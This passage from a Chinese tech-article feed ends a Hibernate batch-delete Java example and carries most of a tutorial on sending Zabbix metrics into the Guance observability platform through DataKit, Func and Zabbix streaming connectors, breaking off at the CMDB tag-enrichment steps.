    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchDeleteProductsByPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            List&lt;Product&gt; products = session.createQuery(<span class="hljs-string">"from Product where price &gt; :price"</span>, Product.class)
                                            .setParameter(<span class="hljs-string">"price"</span>, price)
                                            .list();
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span> (Product product : products) {
                session.delete(product);

                <span class="hljs-comment">// 每批次20个进行一次批处理</span>
                <span class="hljs-keyword">if</span> (++count % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>) {
                    session.flush();
                    session.clear();
                }
            }
            transaction.commit();
            System.out.println(<span class="hljs-string">"Products deleted successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-7">总结</h3>
<ol>
<li><strong>使用HQL进行批量删除</strong>：通过HQL语句可以直接执行批量删除操作，避免逐条删除实体。</li>
<li><strong>配置Hibernate批量操作设置</strong>：通过在<code>hibernate.cfg.xml</code>中设置<code>hibernate.jdbc.batch_size</code>等属性，可以优化批量删除的性能。</li>
<li><strong>批量删除示例</strong>：通过使用批量操作设置和定期刷新清理会话，可以有效地处理大批量的数据删除。</li>
</ol>
<p>通过这些方法，可以显著提高Hibernate应用程序的批量删除性能。希望这些详细的解释和代码示例能帮助您更好地理解和应用Hibernate的批量删除技术。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[观测云接入 Zabbix 数据最佳实践]]></title>    <link>https://juejin.cn/post/7597635202324561972</link>    <guid>https://juejin.cn/post/7597635202324561972</guid>    <pubDate>2026-01-21T10:16:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324561972" data-draft-id="7597483279270559759" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="观测云接入 Zabbix 数据最佳实践"/> <meta itemprop="keywords" content="Zabbix"/> <meta itemprop="datePublished" content="2026-01-21T10:16:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="可观测性用观测云"/> <meta itemprop="url" content="https://juejin.cn/user/2392958212523102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            观测云接入 Zabbix 数据最佳实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392958212523102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    可观测性用观测云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:16:25.000Z" title="Wed Jan 21 2026 10:16:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Zabbix 介绍</h2>
<p>Zabbix 是一个开源的企业级监控解决方案，它可以监控各种网络参数，服务器健康状态，应用程序性能等，并提供灵活的告警机制和丰富的报表功能。</p>
<p><strong>1、Zabbix Server</strong></p>
<ul>
<li>核心组件，负责接收和处理所有监控数据，生成报警和报表。</li>
<li>需要一个数据库来存储所有配置和监控数据。</li>
</ul>
<p><strong>2、Zabbix Agent</strong></p>
<ul>
<li>部署在被监控的设备上，负责收集本地资源和应用数据，并发送给 Zabbix Server。</li>
<li>支持多种操作系统，包括 Linux、Windows 和 Unix。</li>
<li>其中 Agent 分为 Zabbix Agent 和 Zabbix Agent 2，后者是增强版 Agent，支持插件，适合大规模监控。</li>
</ul>
<p><strong>3、Zabbix Proxy</strong></p>
<ul>
<li>用于分担 Zabbix Server 的负载，尤其适用于大规模分布式监控。</li>
<li>可以在远程网络中收集数据并转发给 Zabbix Server。</li>
</ul>
<p><strong>4、Zabbix Web Interface</strong></p>
<ul>
<li>基于 PHP 的 Web 界面，用于配置、管理和查看监控数据。</li>
<li>提供用户管理、权限控制、仪表盘和报表等功能。</li>
</ul>
<p><strong>5、数据库</strong></p>
<ul>
<li>存储所有的配置、监控数据、历史记录等。</li>
<li>支持多种数据库，如 MySQL、PostgreSQL、Oracle、SQLite。</li>
</ul>
<h2 data-id="heading-1">观测云</h2>
<p>观测云是一款专为 IT 工程师打造的全链路可观测产品，它集成了基础设施监控、应用程序性能监控和日志管理，为整个技术栈提供实时可观察性。这款产品能够帮助工程师全面了解端到端的用户体验追踪，了解应用内函数的每一次调用，以及全面监控云时代的基础设施。此外，观测云还具备快速发现系统安全风险的能力，为数字化时代提供安全保障。</p>
<h3 data-id="heading-2">部署 DataKit</h3>
<p>DataKit 是一个开源的、跨平台的数据收集和监控工具，由观测云开发并维护。它旨在帮助用户收集、处理和分析各种数据源，如日志、指标和事件，以便进行有效的监控和故障排查。DataKit 支持多种数据输入和输出格式，可以轻松集成到现有的监控系统中。（注意，请安装完整版 DataKit，Lite 版本 DataKit 没有 Zabbix 相关采集器。）</p>
<p>登录<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.guance.com%2F" target="_blank" title="https://www.guance.com/" ref="nofollow noopener noreferrer">观测云控制台</a>，在「集成」 - 「DataKit」选择对应安装方式。这里使用主机方式安装。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7599dd7005c04987a936f5bcef7e970f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=FrD1nY%2BZQjMy9kSmGPcQj9tEREY%3D" alt="" loading="lazy"/></p>
<p>复制一键安装命令，登陆到目标服务器执行该命令即可实现一键安装。</p>
<p>执行 <code>datakit monitor</code> 命令查看 DataKit 运行状态。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edd219c16b4d48ea813b3c4384d8aded~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=t6MIZEuv4lfk9LyA8DeB1R88TCs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">指标数据采集</h2>
<h3 data-id="heading-4">Zabbix API 方式（zabbix &gt;= 5.0)</h3>
<h4 data-id="heading-5">DataKit 方式</h4>
<p>1、配置 pythond 配置文件</p>
<p>进入 DataKit 的配置文件目录 <code>conf.d</code>，进入 pythond 目录，复制 <code>pythond.conf.sample</code> 为 <code>pythond.conf</code>, 修改如下配置：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[[inputs.pythond]]</span>
  <span class="hljs-comment"># Python input name</span>
  <span class="hljs-attr">name</span> = <span class="hljs-string">'zabbix_collect'</span>  <span class="hljs-comment"># required</span>

  <span class="hljs-comment"># System environments to run Python</span>
  <span class="hljs-comment">#envs = ['LD_LIBRARY_PATH=/path/to/lib:$LD_LIBRARY_PATH',]</span>
  <span class="hljs-attr">envs</span> = [<span class="hljs-string">'ZABBIX_HOST=http://127.0.0.1/zabbix'</span>, <span class="hljs-string">'ZABBIX_USER=Admin'</span>, <span class="hljs-string">'ZABBIX_PASSWD=zabbix'</span>, <span class="hljs-string">'ZABBIX_VERSION=7.0'</span>, <span class="hljs-string">'COLLECT_TYPE=api'</span>]

  <span class="hljs-comment"># Python path(recomment abstract Python path)</span>
  <span class="hljs-attr">cmd</span> = <span class="hljs-string">"python3"</span> <span class="hljs-comment"># required. python3 is recommended.</span>

  <span class="hljs-comment"># Python scripts relative path</span>
  <span class="hljs-attr">dirs</span> = [<span class="hljs-string">"zabbix"</span>]
</code></pre>
<p>其中 <code>ZABBIX_HOST</code>，<code>ZABBIX_USER</code>，<code>ZABBIX_PASSWD</code>，<code>ZABBIX_VERSION</code> 填写实际 Zabbix 的地址用户名密码和版本。</p>
<p>保存并退出。</p>
<p>2、复制脚本</p>
<p>进入 DataKit 目录，进入 <code>python.d</code> 目录，创建 zabbix 目录，点击下方链接下载脚本到 zabbix 目录下：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fstatic.guance.com%2Fintegrations%2Fzabbix%2Fzabbix-collector.py" target="_blank" title="https://static.guance.com/integrations/zabbix/zabbix-collector.py" ref="nofollow noopener noreferrer">static.guance.com/integration…</a></p>
<p>3、重启 DataKit</p>
<pre><code class="hljs">datakit service -R
</code></pre>
<p>4、检查采集任务，出现 zabbix_collect 任务则说明采集任务开启成功</p>
<pre><code class="hljs">datakit monitor
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2c18a5830f144bfa5fb6ac1fbc186de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=ZEOkdXJAHBEsEK%2B9nMwHiBIGCZQ%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-6">Func 方式</h4>
<p>1、安装采集脚本</p>
<p>登录 Func，点击「脚本市场」，选择预装脚本市场，点击管理按钮，进入预装脚本市场的脚本列表页。在过滤搜索框中输入 ，过滤出 zabbix 采集脚本。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9827b85247344a82b6a9e4a036c51167~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=8pf8WY4hoj4APmKdb6VlRPTX000%3D" alt="" loading="lazy"/></p>
<p>点击安装按钮，并在弹出的确认框点击确认按钮。点击确认后，在弹出的部署对话框中输入 zabbix 的地址，用户名，密码，以及版本号。确认信息无误后，点击部署启动脚本，即可完成脚本的部署以及采集任务的创建。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10cd5cc64029450497bddbbe2a9e2d3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=4Kw6%2FbbrrlFcENVZe2FmukaeO9o%3D" alt="" loading="lazy"/></p>
<p>2、查看采集结果</p>
<p>登录观测云，点击「指标」 - 「指标管理」，查找 zabbix 指标，看是否采集到。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c2d0ab17bd945979786a91b33e93fb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=0Yd83iJ%2Bv6NYeklAPKSOkKeUH0A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">Streaming 方式（zabbix &gt;= 6.4）</h3>
<p>该方式类似于 Prometheus 的 Remote Write，由 zabbix server 主动将数据打给 DataKit，有较高的时效性。</p>
<h4 data-id="heading-8">HTTP Server</h4>
<h5 data-id="heading-9">DataKit 方式</h5>
<p>1、配置 pythond 配置文件</p>
<p>进入 DataKit 的配置文件目录 <code>conf.d</code>，进入 <code>python.d</code> 目录，复制 <code>pythond.conf.sample</code> 为 <code>pythond.conf</code>，修改如下配置：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[[inputs.pythond]]</span>
  <span class="hljs-comment"># Python input name</span>
  <span class="hljs-attr">name</span> = <span class="hljs-string">'zabbix_collect'</span>  <span class="hljs-comment"># required</span>

  <span class="hljs-comment"># System environments to run Python</span>
  <span class="hljs-comment">#envs = ['LD_LIBRARY_PATH=/path/to/lib:$LD_LIBRARY_PATH',]</span>
  <span class="hljs-attr">envs</span> = [<span class="hljs-string">'ZABBIX_HOST=http://127.0.0.1/zabbix'</span>, <span class="hljs-string">'ZABBIX_USER=Admin'</span>, <span class="hljs-string">'ZABBIX_PASSWD=zabbix'</span>, <span class="hljs-string">'ZABBIX_VERSION=7.0'</span>, <span class="hljs-string">'COLLECT_TYPE=stream'</span>, <span class="hljs-string">'STREAM_LISTENER_PORT=8000'</span>]

  <span class="hljs-comment"># Python path(recomment abstract Python path)</span>
  <span class="hljs-attr">cmd</span> = <span class="hljs-string">"python3"</span> <span class="hljs-comment"># required. python3 is recommended.</span>

  <span class="hljs-comment"># Python scripts relative path</span>
  <span class="hljs-attr">dirs</span> = [<span class="hljs-string">"zabbix"</span>]
</code></pre>
<p>其中 <code>ZABBIX_HOST</code>，<code>ZABBIX_USER</code>，<code>ZABBIX_PASSWD</code>，<code>ZABBIX_VERSION</code> 填写实际 Zabbix 的地址用户名密码和版本。</p>
<p>注意，COLLECT_TYPE 必须为 stream， 可根据需要调整 STREAM_LISTENER_PORT 的值。</p>
<p>保存并退出。</p>
<p>2、复制脚本</p>
<p>进入 DataKit 目录，进入 pythond 目录，创建 zabbix 目录，点击下方链接下载脚本到 zabbix 目录下：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fstatic.guance.com%2Fintegrations%2Fzabbix%2Fzabbix-collector.py" target="_blank" title="https://static.guance.com/integrations/zabbix/zabbix-collector.py" ref="nofollow noopener noreferrer">static.guance.com/integration…</a></p>
<p>3、重启 DataKit</p>
<pre><code class="hljs">datakit service -R
</code></pre>
<p>4、检查采集任务，出现 zabbix_collect 任务则说明采集任务开启成功</p>
<pre><code class="hljs">datakit monitor
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/566c0bcd2ab24e0b80d8534067aafae2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=T%2BedZ4YNri%2FF61gfgjjg%2B6kYhZs%3D" alt="" loading="lazy"/></p>
<p>5、创建 Zabbix 连接器</p>
<p>登录 Zabbix，点击管理 -&gt; 常规 -&gt; 连接器，点击创建连接器，URL处输入 DataKit 的地址以及 <code>zabbix stream</code> 的监听端口（默认8000），信息类型选择数字和浮点数，点击添加。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77456d272b7342769f2883bf605a6eff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=Da8hzZy66f2MeVNOoT0VvHEfQQw%3D" alt="" loading="lazy"/></p>
<p>6、修改 <code>zabbix_server.conf</code>，修改 <code>StartConnectors</code> 为10，保存并重启 <code>zabbix-server</code> 服务</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adbe2bcadbe94c99bbbb4c5d6c6e47d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=zn7Fm518i3YP0pILmghv6kq5uyE%3D" alt="" loading="lazy"/></p>
<p>7、验证指标采集结果</p>
<h5 data-id="heading-10">Func 方式</h5>
<p>1、安装采集脚本</p>
<p>登录 Func，点击「脚本市场」，选择预装脚本市场，点击管理按钮，进入预装脚本市场的脚本列表页。在过滤搜索框中输入zabbix Stream ，过滤出zabbix Stream采集脚本。点击安装即可。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e492c3dabc2f41a3ae4f096d771ac741~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=%2BayeJnHexD1aPYxpW06QJRTEYFs%3D" alt="" loading="lazy"/></p>
<p>2、创建URL</p>
<p>登录 Func，点击「管理」 - 「同步 API」（建议使用异步API）- 「新建」， 执行一栏选择刚导入脚本中的 <code>Zabbix Receiver</code> 方法，在参数指定中配置采集任务相关的配置，需要指定 <code>zabbix_host</code>，<code>zabbix_user</code>，<code>zabbix_passwd</code>，<code>zabbix_version</code> 为实际的值，<code>base64</code> 为 Zabbix 入参，此处填 <code>INPUT_BY_CALLER</code>，点击保存，并复制 url。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c028ed97fa849b89c4835f19a3fa9f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=4rSuVlqpppTmp3ZUfQ4mqxApCgQ%3D" alt="" loading="lazy"/></p>
<p>3、创建 Zabbix 连接器</p>
<p>登录 Zabbix， 点击管理 -&gt; 常规 -&gt; 连接器，点击创建连接器，URL 处输入上一步创建的 url，信息类型选择数字和浮点数，点击添加。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/962272f03dcb4d32a56514399583aeb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=LaP0QwlgdB0nTFMeXybhIBABwAI%3D" alt="" loading="lazy"/></p>
<p>4、修改 <code>zabbix_server.conf</code>，修改 <code>StartConnectors</code> 为10，保存并重启 <code>zabbix-server</code> 服务</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05c9d21eee8d44a0affc61ad6da3d6e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=CI%2FiPeZcAtwKoFxvLqLaFcXKMEs%3D" alt="" loading="lazy"/></p>
<p>5、验证指标采集结果</p>
<h4 data-id="heading-11">Kafka</h4>
<p>该方式原理同 HTTP 方式消费指标数据，区别在于该方法引入了 Kafka 组件，需部署一个 HTTP 服务用于接收 Zabbix 的 stream 输出并将消息发送到 Kafka 中，详见<a href="https://link.juejin.cn?target=https%3A%2F%2Fgit.zabbix.com%2Fprojects%2FZT%2Frepos%2Fkafka-connector%2Fbrowse%25EF%25BC%258C%25E5%2586%258D%25E7%2594%25B1%25E6%25B6%2588%25E8%25B4%25B9%25E8%2580%2585%25E8%25AE%25A2%25E9%2598%2585" target="_blank" title="https://git.zabbix.com/projects/ZT/repos/kafka-connector/browse%EF%BC%8C%E5%86%8D%E7%94%B1%E6%B6%88%E8%B4%B9%E8%80%85%E8%AE%A2%E9%98%85" ref="nofollow noopener noreferrer">git.zabbix.com/projects/ZT…</a> Kafka，进行数据消费。</p>
<h3 data-id="heading-12">指标治理</h3>
<h4 data-id="heading-13">Zabbix 指标数据结构</h4>
<p>Zabbix 以主机为维度统计指标和告警。所以所有的指标必然包含主机信息。主机往往绑定一个或多个接口。</p>
<p>Zabbix 的指标（<code>item key</code>） 的形式为 <code>key[param1,param2,param3]</code>。其中 <code>params</code> 分为静态值和变量两种。</p>
<p>如 <code>vfs.fs.size[{#FSNAME},pused]</code>。其中 <code>key</code> 为 <code>vfs.fs.size</code>，<code>{#FSNAME}</code> 是动态参数，指实际文件系统名，<code>pused</code> 为静态参数，指使用量。</p>
<p>上述采集方式中 <code>zabbix api</code>，<code>Streaming</code>，<code>Zabbix Agent 2</code> 三种采集方式均默认使用该规则进行指标映射。</p>
<h4 data-id="heading-14">建议的指标治理规则</h4>
<p>由于 Zabbix 的数据结构跟观测云存在较大差异，为方便指标的使用与管理，结合实际企业用户的部署经验，对于 API 和 Streaming 的采集方式，我们建议 Zabbix 指标数据上传到观测云时按如下规则进行转换：</p>
<ul>
<li>measurement (指标集)：<code>zabbix key</code> 第一个 '.' 前的内容。</li>
<li>fields (指标)：<code>zabbix key</code> + 所有静态参数。如 <code>vfs.fs.size[{#FSNAME},pused]</code>，就会变成 <code>vfs.fs.size.pused</code>，<code>system.cpu.load[all,avg1]</code>，就会变成<code>system.cpu.load.all.avg1</code>。</li>
<li>tags (标签)：<code>zabbix item key</code> 中的所有动态参数小写。同时会添加 <code>host</code>，<code>ip</code> 以及 <code>item</code> 的 <code>tag</code>s。如：<code>vfs.fs.size[{#FSNAME},pused]</code> 的 <code>tag</code> 为 <code>fsname</code>。</li>
</ul>
<p>Example：</p>

































































<table><thead><tr><th>Zabbix item key</th><th>measurement</th><th>Field</th><th>tags</th></tr></thead><tbody><tr><td>vfs.dev.queue_size[{#DEVNAME}]</td><td>vfs</td><td>vfs.dev.queue_size</td><td>devname</td></tr><tr><td>vfs.dev.read.await[{#DEVNAME}]</td><td>vfs</td><td>vfs.dev.read.await</td><td>devname</td></tr><tr><td>vfs.dev.read.rate[{#DEVNAME}]</td><td>vfs</td><td>vfs.dev.read.rate</td><td>devname</td></tr><tr><td>vfs.file.contents[/sys/block/{#DEVNAME}/stat]</td><td>vfs</td><td>vfs.file.contents._sys_blck__stat</td><td>devname</td></tr><tr><td>vfs.file.contents["/sys/class/net/{#IFNAME}/type"]</td><td>vfs</td><td>vfs.file.contents._sys_class_net__type</td><td>ifname</td></tr><tr><td>vfs.fs.inode[{#FSNAME},pfree]</td><td>vfs</td><td>vfs.fs.inode.pfree</td><td>fsname</td></tr><tr><td>vfs.fs.size[{#FSNAME},pused]</td><td>vfs</td><td>vfs.fs.size.pused</td><td>fsname</td></tr><tr><td><a href="https://link.juejin.cn?target=http%3A%2F%2Fnet.if.in%2F" target="_blank" title="http://net.if.in/" ref="nofollow noopener noreferrer">net.if.in</a>["{#IFNAME}",dropped]</td><td>vfs</td><td>net.if.in.dropped</td><td>ifname</td></tr><tr><td><a href="https://link.juejin.cn?target=http%3A%2F%2Fnet.if.in%2F" target="_blank" title="http://net.if.in/" ref="nofollow noopener noreferrer">net.if.in</a>["{#IFNAME}"]</td><td>vfs</td><td><a href="https://link.juejin.cn?target=http%3A%2F%2Fnet.if.in%2F" target="_blank" title="http://net.if.in/" ref="nofollow noopener noreferrer">net.if.in</a></td><td>ifname</td></tr></tbody></table>
<h4 data-id="heading-15">使用 Pipeline 的 reference table 实现自定义 Tag</h4>
<p>场景：对于已有 CMDB 的客户，希望将主机的一些字段富足到指标 Tag 中。如应用、负责人信息等。</p>
<p>方式：使用 Pipeline 的 refertable 功能。</p>
<p>具体步骤：</p>
